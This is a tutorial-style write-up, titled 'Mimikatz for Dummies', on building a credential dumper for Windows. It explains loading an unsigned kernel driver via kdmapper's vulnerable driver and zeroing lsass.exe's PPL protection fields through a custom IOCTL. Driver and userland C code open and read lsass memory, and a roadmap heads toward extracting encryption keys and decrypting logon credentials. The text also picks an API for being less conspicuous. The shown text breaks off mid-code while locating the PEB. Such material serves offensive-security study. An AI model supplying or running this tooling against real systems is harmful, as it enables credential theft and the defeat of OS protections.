# Mimikatz for Dummies 

I want to shoutout these resources and researchers that made this project possible:
*  [Maldev Academy](https://maldevacademy.com/)
* [Exploring Mimikatz - Part 1 - WDigest - XPN InfoSec Blog](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
* [Uncovering Mimikatz 'msv' and collecting credentials through PyKD :: — uf0](https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/)
* [YOUR FIRST KERNEL DRIVER (FULL GUIDE)](https://www.youtube.com/watch?v=n463QJ4cjsU&t=4319s)

I've wanted to make a project like this for a while (12/24/2023 to be exact, wow time really flies) so I'm very grateful for their knowledge and the time and effort they put into their writeups

![discord](attachments/Pasted%20image%2020250903225256.png)

Shoutout to [Soups71 (Soups)](https://github.com/soups71) for listening to my incessant progress updates and bouncing ideas around with me.

If you already feel comfortable in these topics then I highly recommend checking out the resources above.  If you have some experience dabbling in the Windows API and have always been curious how Mimikatz works, but dont really know where to start, then you are my target audience and I hope you gain something!

# Setup

My setup very closely follows that described in [YOUR FIRST KERNEL DRIVER (FULL GUIDE)](https://www.youtube.com/watch?v=n463QJ4cjsU&t=4319s).  If you would like help setting up a VM that you can kernel debug from your Windows host, this video is my recommendation.
# Protections

Before we get into writing code to exploit lsass, we first need to understand what we're up against. Tackling [Credential Guard]([How Credential Guard works | Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works)) will be done in another project, for now I'm focusing on simply dealing with LSA Protection AND LSASS encryption.  I do however highly recommend reading up on Credential Guard, and how it may impact you.

## LSA Protection

Starting in Windows 8.1, LSA Protection (Process Protection Light) only allows trusted code to load into a protected process:

	LSA protection is a security feature that defends sensitive information like credentials from theft by blocking untrusted LSA code injection and process memory dumping. LSA protection runs in the background by isolating the LSA process in a container and preventing other processes, like malicious actors or apps, from accessing the feature. This isolation makes LSA protection a vital security feature, which is why it's enabled by default in Windows 11.

[Configure added LSA protection | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#lsa-and-credential-guard)

	In Windows 8.1, a new concept of protected service has been introduced to allow anti-malware user-mode services to be launched as a protected service. After the service is launched as protected, Windows uses code integrity to only allow trusted code to load into the protected service. Windows also protects these processes from code injection and other attacks from admin processes.
[Protecting anti-malware services - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#introduction)


When a process is not protected, we as the attacker are able to open a process handle to the unprotected process which allows us to pretty easily read and write within its memory address space.  In the case of Mimikatz, once you're an administrator you escalate to `SYSTEM` privileges and gain the `SeDebugPrivilege` token which makes this possible on lsass.

```pwsh
mimikatz # privilege::debug (SeDebugPrivilege to tamper with other processes)
mimikatz # token::elevate (Become SYSTEM since lsass is a SYSTEM process)
```

When a process is run with PPL enabled however, this is no longer possible.

## LSA Protection Workaround


The workaround to LSA protection is at the kernel level.  The `EPROOCESS` struct is an [opaque](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess?redirectedfrom=MSDN) kernel level structure, opaque meaning intentionally unavailable through traditional means to the user, responsible for telling Windows, among other things, whether or not this process is protected or not.

The WIndows kernel keeps a list of all the processes running on a machine in a double-linked list, which as I've come to learn are a common data structure in the Windows kernel and in Lsass.  This list is stored within a global kernel variable called `PsActiveProcessHead`, of type `LIST_ENTRY`

The `LIST_ENTRY` struct is important to understand now since we'll be seeing it later.  Really what you need to know is that `Flink` is a pointer to the next list entry, and `Blink` is the previous.  Generally the way you go about "walking" one of these lists is to store the address of the `LIST_ENTRY` head, or the first entry, and then `Flink` through the list.  Eventually once you've looped through the list the address stored in `Flink` will equal that of the original head entry.
```c
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink; // Pointer to the next entry in the list
    struct _LIST_ENTRY *Blink; // Pointer to the previous entry in the list
} LIST_ENTRY, *PLIST_ENTRY;

```

We can view active processes in Windgb which is going to walk through the `PsActiveProcessHead` we talked about above using the `!process` [command](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-process).

```
!process 0 0 (0 0 = display all processes, brief info)
```

So we can see what that looks like:

![process](attachments/Pasted%20image%2020250901185437.png)

Or if we want a specific process:

![specific process](attachments/Pasted%20image%2020250901185546.png)

The `PROCESS` string is a pointer to the `EPROCESS` structure in kernel memory.  To display contents of a variable in Windbg, we use `dt` ([display type]([dt (Display Type) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/dt--display-type-)))


```
dt [module]![variable name]
dt nt!* (wildcards are supported with dt)
dt nt!_EPROCESS [ADDRESS] (When you know the address of a strcut you can interprit it as such)
```


![EPROCESS](attachments/Pasted%20image%2020250901185907.png)

Here we see the `EPROCESS` struct being pulled from `nt` or [`ntoskrnl`](https://malwaretips.com/blogs/ntoskrnl-exe-what-is-ntoskrnl-exe-should-i-remove-it/).  While Windbg shows us what we need and makes it easier once we're in our program, sometimes research is best done online through sites like [vergiliusproject.com](https://www.vergiliusproject.com/kernels/x64/windows-11/21h2/_EPROCESS) or sites similar that contain online databases of Windows structures.


![eprocessStruct](attachments/Pasted%20image%2020250901190227.png)


Here we can see that its of type [`PS_PROTECTION`.](https://www.vergiliusproject.com/kernels/x64/windows-11/21h2/_PS_PROTECTION).

`PS_PROTECTION` field explanations from: https://www.alex-ionescu.com/?p=146 and [Debugging Protected Processes | itm4n's blog](https://itm4n.github.io/debugging-protected-processes/)

```c
//0x1 bytes (sizeof) 
struct _PS_PROTECTION { 
	union { 
		UCHAR Level; //0x0 
		struct {
			UCHAR Type:3; //Protection Level
			UCHAR Audit:1; //Signature Valid
			UCHAR Signer:4; //DLLs Signatures Valid
		}; 
	};
};
```

The field responsible for protection is `Type`.
```
Type = 0 [Unprotected]
Type = 3 [Protected]
```

You can view your processes protection level simply by clicking the Windbg link for `Protection`

![protection](attachments/Pasted%20image%2020250901191343.png)

Or can you try and pull it manually like this:

```
dt nt!_PS_PROTECTION ffffa886aba20080+0x87a
```
![protectionLevels](attachments/Pasted%20image%2020250901191454.png)
![protOffset](attachments/Pasted%20image%2020250901191849.png)

So if we patch this to zero, our process the target process is unprotected, and our usermode land application can retrieve a file handle and perform read and write operations to its memory address space.  One crucial piece of information that I've left out till now is that**you cant actually read or write to these memory addresses without a kernel driver.**  They live in the kernel's memory address space, not in userland.

![kernelland](attachments/Pasted%20image%2020250901192321.png)

If we write a driver however, and find a way to load it without a signature, then we can unprotect processes at will, and read and write to kernel memory. 
### Driver Protections

Drivers are the pieces of code responsible for interacting with the kernel.  They translate the needs and desires of the user into operands that can be understood by your machines hardware.  They can also act as an intermediary between usermode applications, and kernel mode applications, bridging the gap between the two circles you see in the image above.

Because they are responsible for so much, and are crucial to the operability of your machine, Windows requires drivers to be signed before being released to the public, and before being loaded by the OS.  

[Signing a Driver - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/develop/signing-a-driver)

[`kdmapper`](https://github.com/TheCruZ/kdmapper) is a tool that bypasses this constraint and allows you to map non-signed drivers in memory through a vulnerability in iqvw64e.sys.  With this tool we can load a kernel driver into memory without a signature, interact with it, and remove process protections on `lsass.exe`.

# Writing a Kernel Driver

When I was writing my first kernel driver I heavily relied on cazz's video, linked [here](https://www.youtube.com/watch?v=n463QJ4cjsU&t=4319s).


Using [`DeviceIOControl`](https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) we can send data directly to our driver in kernelland, for our userland process.

We can specify a variety of different actions that we want our driver to take at different times by passing `IO Control Codes` or  IOCTLs.  This program has IOCTLs for the following:
1. Attach
2. Unprotect Process
3. Read memory
4. Write memory
5. Unprotect process
6. Find LogonSessionList and AES/DES Key base addreses
7. Detach

## Attach

To attach to a process we use [`PsLookupProcessByProcessId`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid).  By supplying a PID which we can find in userland, we can recieve a pointer to that processes `EPROCESS` struct which we know will let us unprotect the process, and allows us to work within the bounds of that processes address space for the rest of program execution.

In C the `EPROCESS` struct is referred to as `PEPROCESS`.  Once we've recieved our `EPROCESS` pointer we can apply the known offset to the `Protection` struct of `0x87a` to find the `PROCESS_PROTECTION_INFO` struct holding our PPL values.


In order to actually tell our driver to do something from userland we need to send the corresponding IOCTL code, like we talked about above.


```c
namespace codes {
	//IOCTL codes - drivers to communicate w/ usermode apps and vice versa. 
	//UserMode applications call DeviceIoControl to send a struct -> drivers.
	//Then we recieve the struct and do whatever we want with it.
	//Must be buffered IO so we can send buffers between kernel and userland.
	constexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //setup the driver

	constexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //read process mem

	constexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.

	constexpr ULONG getProtection = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //retreieve protections on process  process mem.
	
	constexpr ULONG unprotect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //unprotect process mem.

	constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.

	constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //find logonsessionlist.
	
	constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //.

}
```

Here we define a list of IOCTL codes using the `CTL_CODE` macro.  Each action gets a unique number, and depending what code we pass to the driver, we can map a different function on the receiving end to run in kerneland.

```c
struct Patterns {
	PVOID pLogonSessionListPattern;
	PVOID pKeysPattern;
};
struct Request {
	HANDLE hPID; //
	PVOID pTargetMemory; //victim process
	PVOID pBuffer;
	SIZE_T sSize;
	SIZE_T sReturn_size;
	PVOID pBase;
	PVOID pEnd;
	Patterns Patterns;
};
...
...
...
bool attachToProcess(const DWORD PID, HANDLE hDriver) {
	Request req;
	req.hPID = (HANDLE)(PID); //because the function in kernel land wants a handle of the PID...
	return DeviceIoControl(hDriver, codes::attach, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
}
```

Passing data to and from a driver can be cumbersome, so it makes more sense to define a structure to hold off the data that we want going to from the driver so we only need to work with one variable as opposed to multiple IOCTL calls since we can really only return one data structure at a time.


Then on driver's side we start off in `DriverEntry()`.  This is like `main()` in traditional programs.

```c
//kdmapper calls DriverEntry
NTSTATUS DriverEntry() {
	//Drivers dont like const char* , they like UNICODE_STRING.  Use this method to initialize.
	UNICODE_STRING uDriverName = {};
	//Name must be \\Driver\\<WHATEVER>
	RtlInitUnicodeString(&uDriverName, L"\\Driver\\noah");
	return IoCreateDriver(&uDriverName, DriverMain); 
}
```
Because our driver is being loaded illegitimacy through kdmapper, we need a way of creating a Driver handle, registry paths, doing all of the backend work that Windows would normally do.   `IoCreateDriver` handles all of that for us, making a new driver (of type  `DRIVER_OBJECT`) with the name of your choice, and then entering  the `DriverMain()` function.


```c
NTSTATUS DriverMain(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

	//Because kdmapper is trying to load our kernel without 'windows knowing' or through traditional means, we need IoCreateDriver because that creates the DriverObject and registry path for us, it makes everythign fall back into alignment w how things wouold be done traditionally.
	UNREFERENCED_PARAMETER(RegistryPath); //we're never going to use this and warnings dont let us compile drivers.
	//Create the drivers device.
	UNICODE_STRING uDeviceName = { };
	RtlInitUnicodeString(&uDeviceName, L"\\Device\\noah"); //driver name always reamins the same.

	if (status != STATUS_SUCCESS) {
		debug_printer("FAILED TO CREATE DRIVER DEVICE....\n");
		return status;
	}

	debug_printer("Driver device succesfully created...\n");

	//Sym link

	UNICODE_STRING uSymLink = {};
	RtlInitUnicodeString(&uSymLink, L"\\DosDevices\\noah"); //driver name always reamins the same.
```

So theres an important distinction between a driver and a device.  A driver does not need a device.  A device does need a driver.  The device is a part of the driver, and its primary roll is to interact with userland.  We could make a driver without a device and that would be syntatically fine, however we wouldn't have a way of talking to usermode.

How does usermode interact with this device?  Its through the SymLink that you see above.  Usermode applications cannot see any of the drivers in the `\Device` namespace, however it can interact with the `\DosDevices` namespace, hence why our device will be stored there and linked back to our kernel driver.

After we setup our SymLink we setup crucial some crucial flags that dictate how the driver works at a high level

```c
	...
	SetFlag(pDeviceObject->Flags, DO_BUFFERED_IO);
	//Setup handlers for driver object -> setup functions that handle calls from OS.
	//Driver event handeling:
	DriverObject->MajorFunction[IRP_MJ_CREATE] = driver::create; //When a call is made to the driver it looks to these functions on what to do.
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = driver::close; //When a call is made to the driver it looks to these functions on what to do.
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = driver::device_control; //When a call is made to the driver it looks to these functions on what to do.
	
	ClearFlag(pDeviceObject->Flags, DO_DEVICE_INITIALIZING);//clearing this means we are now intiialized.
	
	debug_printer("Driver device initialized...\n");
	
	
	return status;
	}
```


`DO_BUFFERED_IO` is exactly what it sounds like, we can send buffers in and out of the driver.  Each driver has different `MajorFunctions`.  We can specify what code runs when any of these major events happens, like the driver is created, closed, or when we recieve and IOCTL code.

When the driver is created we run `driver::create`, closed we run `driver::close`, and when we receive IOCTL codes, we run `driver::device_control`.

Then we initialize the driver.  The driver now waits for IOCTL codes and acts accordingly.  IOCTL codes are sent through a `Input Output Request Packets` or `IRP`.

```c
NTSTATUS device_control(PDEVICE_OBJECT pDeviceObject, PIRP irp) { 		//irp is the packet that carries the data between ICTL devices.
	UNREFERENCED_PARAMETER(pDeviceObject);
	debug_printer("Device Control Called...\n");
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//get stack location of IRP to find which code is being passed.
	PIO_STACK_LOCATION stack_IRP = IoGetCurrentIrpStackLocation(irp);
	//this holds control codes (attach/read/write)
	//we also need request struct:
	auto request = reinterpret_cast<Request*>(irp->AssociatedIrp.SystemBuffer);

	if (request == nullptr || stack_IRP == nullptr) {
		IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
		return status;
	}
```

Here you can see that when we recieve a IOCTL we recieve the data, and then cast it to our Request struct from earlier so we can properly read the data and act on it.

The next step is defining our actual IOCTL code actions, like `attach`, `detach`, ect.  Below shows the attach process:

```c
	static PEPROCESS target_process = nullptr; //this is static and survives after the fucntions been run so we can attach once, and use the same PEPROCESS object later.
	static PROCESS_PROTECTION_INFO* psProtection = nullptr;
	const ULONG control_code = stack_IRP->Parameters.DeviceIoControl.IoControlCode;
	
	switch (control_code) {
	case codes::attach:
		status = PsLookupProcessByProcessId(request->hPID, &target_process);
		psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)target_process)+ 0x87a);
	break;
	...
	...
	...
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = sizeof(Request); //THIS NMEEDS TO BE THE WHOLE STRUCT!!!! NOT just req
	IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
	//if theres a null ptr computer blue screens..
	return status; //OS/User can both see what status is when these handlers are called.
	}
}
```

Using a PID passed by userland on the command to attach, the driver reads the Request struct from IRP shown above, and pulls the process handle.  This allows us to find pointers to the `EPROCESS` struct and the `PROCESS_PROTECTION_INFO` struct.

Then at the end of every IOCTL we call `IoCompleteRequest`.

## Unprotect

You can see in the `driver::attach` code segment above, we're defining `target_process` and `psProtection` as static variables.  They wont change after they're found the first time.  We simply call back to the `psProtection` struct which was populated during the attach process and set the correct values to unprotect our process:

```c
case codes::unprotect:
	if (target_process != nullptr && psProtection != nullptr) {
		psProtection->SignatureLevel = 0;
		psProtection->SectionSignatureLevel = 0;
		psProtection->Protection.Type = 0; // accessing Type from the PS_PROTECTION struct
		psProtection->Protection.Signer = 0; // same thing with Signer
		debug_printer("Removed signature and protection...\n");
		status = STATUS_SUCCESS;

	}
	break;
```


# Userland Code
## Driver Setup

Now with the process unprotected, we're ready to make the jump into userland!  We'll get into Lsass functionality soon but first we'll quickly cover setting up our driver:

```c
int main(int argc, wchar_t* argv[]) {
	//Driver stuf...
	const HANDLE hDriver = CreateFile(L"\\\\.\\noah", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("ERROR W DRIVER HANDLE");
		return 1;
	}
	DWORD TargetPID;
	HANDLE hTarget;
	if (!GetRemoteProcessHandle(&hTarget, &TargetPID)) {
		printf("Failed to get process handle!\n");
		return 0;
	}
	PVOID pERPROCESS = NULL;
	//Driver is attaching to target process via PID.
	if (driver::attachToProcess(TargetPID, hDriver) == true) {
		printf("Attached!\n");
	}
	//Driver is now attached and we need to parse through process memory.

	if (driver::unprotect(hDriver) == true) {
		printf("Removed protections from target process...\n");
	}
	...
```

You can see us running `CreateFile` pointed at `\\\\.\\noah` which translates to `\\.\noah` without escape characters.  This is equivalent to saying `\\DosDevices\noah` which is the path we specified in our driver code.   This `HANDLE` is how Windows knows where to send our IRP requests.  

Then we run `GetRemoteProcessHandle` which opens a process handle to `lsass.exe`

Finally we attach to the process and then unprotect it.

## GetRemoteProcessHandle

Before getting a process handle we first need to find it.  This can be done many different ways, I chose to use `NtQuerySystemInformation` because its a little less overt then a common enumeration function like [`EnumProcesses`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses).


```c
NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
```
The `SYSTEM_INFORMATION_CLASS`  struct specifies what kind of information you want returned from this function.  Passing `SystemProcessInformation` really just tells the function we don't need any additional information, the baseline operation of the function is enough.


```c
//Target Process
const wchar_t* wProc = L"lsass.exe";
const wchar_t* wTargetDLL = L"C:\\Windows\\system32\\lsasrv.dll";
...
...
bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll"); //i know these strings r baddddd
	fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

	if (!hNtdll) {
		printf("Failure finding module...");
		return false;
	}
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation"); //i should probabyl do some kind fo encoding for this..

	if (!pNtQuerySystemInformation) {
		printf("Failure finding fucntions...");
		return false;
	}
```

First we get a module handle to `Ntdll.dll` so that we can find a pointer to the `NtQuerySystemInformation` function and call it.


```c
	ULONG ReturnLength1 = 0x00; //needed buffer size for systemprocessinformation buffer
	ULONG ReturnLengthSystemInfo = 0x00; //actual returned buffer size for systemprocess information
	//first call tells us how big it needs to be..
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength1); //Now we're getting system proc info..

	//Second call populates..
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);

	NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation, ReturnLength1, &ReturnLengthSystemInfo); //Now we're getting system proc info..

	if (!pSystemProcessInformation && status != 0x00) {
		printf("SystemProcessInformation is empty...");
		return 0;
	}
```

The `SYSTEM_PROCESS_INFORMATION` struct contains a lot of system process data.  It contains PIDs, names, creation times, threads, PIDS, ect.  We can loop through the processes captured within this strcut to find our target process and open a new file handle with` PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION` privileges.

```c
	while (true) {
		if (pSystemProcessInformation->ImageName.Length && wcscmp(pSystemProcessInformation->ImageName.Buffer, wProc) == 0) { //make sure the process ahs a name 
			// openning a handle to the target process and saving it, then breaking 
			wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", pSystemProcessInformation->ImageName.Buffer, pSystemProcessInformation->UniqueProcessId);
			*hTarget = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pSystemProcessInformation->UniqueProcessId);
			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;
			break;
		}
		if (!pSystemProcessInformation->NextEntryOffset) {
			printf("Broken?");
			break;
		}
		// moving to the next element in the array
		pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
	}
	//https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess?redirectedfrom=MSDN
	return true;
}
```

With this `hTarget` now contains a `HANDLE` to lsass.exe!

# Lsass Operations

If you're still here, thank you for your time.  If you skipped down here, you're smarter then me when I started this project and I applaud you :)

Here is the general roadmap on what we need to do:
1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space 
6. Find `LogonSessionList` pattern match address in lsasrv.dll
7. Find AES/DES/IV Key pattern match address in lsasrv.dll 
8. 9. Extract AES / DES / IV Keys
9. Read through LogonSessionList for encrypted security blobs
10. Decrypt encrypted security blob
11. MONEY!

I know thats a lot, but just stay with me!


## Finding Lsasrv

`Lsasrv.dll` stores all of the credentials and keys in memory that we're looking for.  We need to find the base address of Lsasrv so that we have a basis to start searching for everything.  To do this we can examine the lsass process's Process Environment Block (PEB).

Every process has a [PEB](https://malwareandstuff.com/peb-where-magic-is-stored/) stored in its usermode memory space that looks like this:

```
dt nt!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
   +0x003 IsPackagedProcess : Pos 4, 1 Bit
   +0x003 IsAppContainer   : Pos 5, 1 Bit
   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit
   +0x004 Padding0         : [4] UChar
   +0x008 Mutant           : Ptr64 Void
   +0x010 ImageBaseAddress : Ptr64 Void
   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA
   +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS
   +0x028 SubSystemData    : Ptr64 Void
   +0x030 ProcessHeap      : Ptr64 Void
   +0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION
   +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER
   +0x048 IFEOKey          : Ptr64 Void
   +0x050 CrossProcessFlags : Uint4B
   +0x050 ProcessInJob     : Pos 0, 1 Bit
   +0x050 ProcessInitializing : Pos 1, 1 Bit
   +0x050 ProcessUsingVEH  : Pos 2, 1 Bit
   +0x050 ProcessUsingVCH  : Pos 3, 1 Bit
   +0x050 ProcessUsingFTH  : Pos 4, 1 Bit
   +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit
   +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit
   +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit
   +0x050 ReservedBits0    : Pos 8, 24 Bits
   +0x054 Padding1         : [4] UChar
   +0x058 KernelCallbackTable : Ptr64 Void
   +0x058 UserSharedInfoPtr : Ptr64 Void
   +0x060 SystemReserved   : Uint4B
   +0x064 AtlThunkSListPtr32 : Uint4B
   +0x068 ApiSetMap        : Ptr64 Void
   +0x070 TlsExpansionCounter : Uint4B
   +0x074 Padding2         : [4] UChar
   +0x078 TlsBitmap        : Ptr64 Void
   +0x080 TlsBitmapBits    : [2] Uint4B
   +0x088 ReadOnlySharedMemoryBase : Ptr64 Void
   +0x090 SharedData       : Ptr64 Void
   +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void
   +0x0a0 AnsiCodePageData : Ptr64 Void
   +0x0a8 OemCodePageData  : Ptr64 Void
   +0x0b0 UnicodeCaseTableData : Ptr64 Void
   +0x0b8 NumberOfProcessors : Uint4B
   +0x0bc NtGlobalFlag     : Uint4B
   +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER
   +0x0c8 HeapSegmentReserve : Uint8B
   +0x0d0 HeapSegmentCommit : Uint8B
   +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B
   +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B
   +0x0e8 NumberOfHeaps    : Uint4B
   +0x0ec MaximumNumberOfHeaps : Uint4B
   +0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void
   +0x0f8 GdiSharedHandleTable : Ptr64 Void
   +0x100 ProcessStarterHelper : Ptr64 Void
   +0x108 GdiDCAttributeList : Uint4B
   +0x10c Padding3         : [4] UChar
   +0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION
   +0x118 OSMajorVersion   : Uint4B
   +0x11c OSMinorVersion   : Uint4B
   +0x120 OSBuildNumber    : Uint2B
   +0x122 OSCSDVersion     : Uint2B
   +0x124 OSPlatformId     : Uint4B
   +0x128 ImageSubsystem   : Uint4B
   +0x12c ImageSubsystemMajorVersion : Uint4B
   +0x130 ImageSubsystemMinorVersion : Uint4B
   +0x134 Padding4         : [4] UChar
   +0x138 ActiveProcessAffinityMask : Uint8B
   +0x140 GdiHandleBuffer  : [60] Uint4B
   +0x230 PostProcessInitRoutine : Ptr64     void 
   +0x238 TlsExpansionBitmap : Ptr64 Void
   +0x240 TlsExpansionBitmapBits : [32] Uint4B
   +0x2c0 SessionId        : Uint4B
   +0x2c4 Padding5         : [4] UChar
   +0x2c8 AppCompatFlags   : _ULARGE_INTEGER
   +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER
   +0x2d8 pShimData        : Ptr64 Void
   +0x2e0 AppCompatInfo    : Ptr64 Void
   +0x2e8 CSDVersion       : _UNICODE_STRING
   +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   +0x318 MinimumStackCommit : Uint8B
   +0x320 SparePointers    : [4] Ptr64 Void
   +0x340 SpareUlongs      : [5] Uint4B
   +0x358 WerRegistrationData : Ptr64 Void
   +0x360 WerShipAssertPtr : Ptr64 Void
   +0x368 pUnused          : Ptr64 Void
   +0x370 pImageHeaderHash : Ptr64 Void
   +0x378 TracingFlags     : Uint4B
   +0x378 HeapTracingEnabled : Pos 0, 1 Bit
   +0x378 CritSecTracingEnabled : Pos 1, 1 Bit
   +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit
   +0x378 SpareTracingBits : Pos 3, 29 Bits
   +0x37c Padding6         : [4] UChar
   +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B
   +0x388 TppWorkerpListLock : Uint8B
   +0x390 TppWorkerpList   : _LIST_ENTRY
   +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void
   +0x7a0 TelemetryCoverageHeader : Ptr64 Void
   +0x7a8 CloudFileFlags   : Uint4B
   +0x7ac CloudFileDiagFlags : Uint4B
   +0x7b0 PlaceholderCompatibilityMode : Char
   +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char
   +0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA
   +0x7c0 LeapSecondFlags  : Uint4B
   +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit
   +0x7c0 Reserved         : Pos 1, 31 Bits
   +0x7c4 NtGlobalFlag2    : Uint4B
```


Because this structure is stored in usermode memory, we can access this structure to retrieve crucial information about remote and local processes.  At offset +0x18 you'll see a pointer to a `PEB_LDR_DATA` structure.

```
   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA
```

What is this structure?  The `PEB_LDR_DATA` structure holds a `LIST_ENTRY` struct for all of the modules loaded in the process you're examining.  So if we can loop through this list, we can search for Lsasrv and get its location in memory, hence why we need to find the PEB.

```c
typedef struct _PEB_LDR_DATA {
    ULONG Length;                          // Size of this structure
    BOOLEAN Initialized;                   // Indicates if the structure is initialized
    PVOID SsHandle;                        // Reserved
    LIST_ENTRY InLoadOrderModuleList;      // List of modules in load order
    LIST_ENTRY InMemoryOrderModuleList;    // List of modules in memory order
    LIST_ENTRY InInitializationOrderModuleList; // List of modules in initialization order
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```
## Finding the PEB

So we've established we need to find the PEB in order to find Lsasrv. How do we find the PEB?

```c
bool locatePEB(HANDLE hTarget, PVOID* pPEB) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return false;

	printf("NTDLL Handle\n");
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	
	if (!pNtQueryInformationProcess) return false;

	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };
	ULONG ulRetLength = 0;

